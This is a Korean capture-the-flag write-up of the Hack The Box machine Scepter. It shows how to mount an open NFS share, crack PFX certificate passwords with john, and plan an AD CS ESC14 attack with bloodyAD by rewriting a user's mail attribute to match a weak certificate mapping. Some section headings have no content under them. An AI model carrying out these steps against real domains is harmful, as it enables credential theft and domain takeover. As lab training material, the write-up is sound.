![Scepter](/assets/htb-windows/scepter/scepter.png)

**Scepter**는 Hard 난이도의 Windows 머신으로, 초기 침투는 인증이 필요 없는 **NFS 공유에서 PFX 인증서를 획득**하는 것으로 시작된다. 이를 통해 도메인 사용자로 인증한 뒤, `a.carter` 계정에 대해 **ForceChangePassword** 권한을 이용해 비밀번호를 변경하고 계정을 탈취한다. 이후 `a.carter` 는 IT SUPPORT 그룹 소속으로, 해당 그룹이 **STAFF ACCESS CERTIFICATE OU에 대해 `GenericAll` 권한을 가지고 있어 OU 내 사용자들을 제어할 수 있는 기반을 확보**한다.

권한 상승은 AD CS의 ESC14 취약점을 이용해 진행된다. 먼저 `d.baker` 의 `mail` 속성을 `h.brown@scepter.htb` 로 조작한 뒤 **StaffAccessCertificate 템플릿을 통해 인증서를 발급받아 `h.brown` 계정으로 인증**한다. 이후 `h.brown`이 가진 수정 권한을 이용해 `p.adams` 계정의 `altSecurityIdentities` 값을 `X509:<RFC822>` 형식으로 설정하고, 다시 `d.baker` 의 `mail` 속성을 `p.adams@scepter.htb` 로 변경하여 인증서를 발급받는다.

이를 통해 `p.adams` 계정으로 인증할 수 있게 되며, 최종적으로 `p.adams` 의 DCSync 권한을 이용해 도메인 관리자 권한을 획득한다.

# Vulnerability Analysis

## NFS Enumeration

Nmap 스캔 결과 NFS 서비스가 열려 있는 것을 확인했으므로, 먼저 export 목록을 확인하였다:

```bash
$ showmount -e 10.129.244.44   

Export list for 10.129.244.44:
/helpdesk (everyone)
```

결과를 보면 `helpdesk` 디렉토리가 외부에 export되어 있으며, 누구나 접근 가능한 상태임을 확인할 수 있다.

해당 NFS 공유를 로컬에서 확인하기 위해 마운트할 디렉토리를 생성한 뒤, `helpdesk` 를 마운트하였다:

```bash
$ mkdir mount
```

```bash
$ sudo mount -t nfs 10.129.244.44:/helpdesk ./mount/ -o nolock
```

마운트된 디렉토리에 접근할 때 권한 문제가 발생했기 때문에 `root` 셸로 전환한 뒤 내부 파일을 확인하였다:

```bash
\# ls -l 

-rwx------ 1 nobody nogroup 2614 Nov  7 13:51 baker.crt
-rwx------ 1 nobody nogroup 2029 Nov  7 13:51 baker.key
-rwx------ 1 nobody nogroup 3315 Nov  1  2024 clark.pfx
-rwx------ 1 nobody nogroup 3315 Nov  1  2024 lewis.pfx
-rwx------ 1 nobody nogroup 3315 Nov  1  2024 scott.pfx
```

내부에는 여러 인증서 관련 파일(`.crt`, `.key`, `.pfx`)이 존재하는 것을 확인할 수 있다.

### PFX File krack

NFS 공유에서 획득한 인증서 파일들을 로컬 환경으로 복사하였다:

```bash
\# cp -r ./* /home/kali/htb/scepter
```

이후 `.pfx` 파일의 비밀번호를 확인하기 위해 [pfx2john](https://github.com/openwall/john/blob/bleeding-jumbo/run/pfx2john.py)을 이용하여 해시로 변환하였다:

```bash
/# pfx2john scott.pfx > scott.hash

/# pfx2john clark.pfx > clark.hash

/# pfx2john lewis.pfx > lewis.hash
```

생성된 해시를 `john` 으로 크랙한 결과, 모든 PFX 파일의 비밀번호가 동일하게 `newpassword` 임을 확인하였다:

```bash
/# john --wordlist=/usr/share/wordlists/rockyou.txt lewis.hash

/# john --wordlist=/usr/share/wordlists/rockyou.txt scott.hash

/# john --wordlist=/usr/share/wordlists/rockyou.txt clark.hash
```

```bash
/# john --show *.hash

clark.pfx:newpassword:::::clark.pfx
lewis.pfx:newpassword:::::lewis.pfx
scott.pfx:newpassword:::::scott.pfx
```

### Certificate Analysis

크랙한 비밀번호를 이용해 `.crt` 파일을 만든 후 인증서 정보를 확인하였다:

```bash
/# openssl pkcs12 -in scott.pfx -clcerts -nokeys -out scott.crt

Enter Import Password: newpassword
```

```bash
/# openssl x509 -in scott.crt -text -noout      

Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            62:00:00:00:28:27:5b:82:5d:79:68:97:3b:00:00:00:00:00:28

        Issuer: DC=htb, DC=scepter, CN=scepter-DC01-CA

            Not Before: Nov  2 01:01:09 2024 GMT
            Not After : Nov  2 01:01:09 2025 GMT
```

확인 결과, `o.scott` 계정의 인증서는 만료된 상태였으며, `lewis`, `clark` 인증서 또한 동일하게 만료된 상태였다. 

해당 인증서들은 각각 `e.lewis`, `m.clark` 사용자와 매핑되어 있다.

반면, `baker` 인증서는 2035년까지 유효하며, 사용자 `d.baker` 와 매핑되어 있음을 확인할 수 있었다:

### Certificate Authentication (Kerberos)

이후 마운트에서 획득한 `baker` 의 `.crt`, `.key` 파일을 이용해 `.pfx` 파일을 생성하였다:

```bash
/# openssl pkcs12 -inkey baker.key -export -in baker.crt -out baker.pfx

Enter pass phrase for baker.key:
Enter Export Password:
Verifying - Enter Export Password:
```

### ForceChangePassword Abuse

### Identifying Weak Certificate Mapping (h.brown)

이후, [Microsoft 문서](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)에 따르면, AD에서는 사용자 객체의 `altSecurityIdentities` 속성을 이용해 인증서를 사용자에게 수동 매핑할 수 있다.

이 중 이메일 주소 기반의 `X509RFC822` 매핑은 재사용 가능한 값을 기준으로 하기 때문에 약한 매핑으로 분류된다.

따라서 `X509:<RFC822>` 형식의 약한 인증서 매핑이 설정된 사용자가 있는지 확인하였다:

```bash
$ bloodyAD --host 10.129.244.44 -d scepter.htb -u a.carter -p 'Asdf1234@' get object h.brown --attr 'altSecurityIdentities'

distinguishedName: CN=h.brown,CN=Users,DC=scepter,DC=htb
altSecurityIdentities: X509:<RFC822>h.brown@scepter.htb
```


확인 결과, `h.brown` 계정에는 `X509:<RFC822>h.brown@scepter.htb` 값이 설정되어 있었다. 

이는 이메일 주소(`h.brown@scepter.htb`)를 기반으로 인증서가 `h.brown` 계정에 매핑될 수 있음을 의미한다.

앞서 확인한 것처럼 `a.carter` 는 `STAFF ACCESS CERTIFICATE` OU에 대해 **GenericAll** 권한을 가지고 있으며, 해당 OU에는 `d.baker` 계정이 포함되어 있다. 
따라서 `a.carter` 권한을 이용하면 `d.baker` 의 LDAP 속성을 수정할 수 있다.

또한 `StaffAccessCertificate` 템플릿은 `mail` 속성을 기반으로 인증서 정보를 생성하므로, `d.baker` 의 `mail` 값을 `h.brown@scepter.htb` 로 변경한 뒤 인증서를 요청하면 `h.brown` 의 `altSecurityIdentities` 값과 매칭되는 인증서를 발급받을 수 있다. 

이를 통해 `h.brown` 계정으로 인증하는 것이 가능해진다.
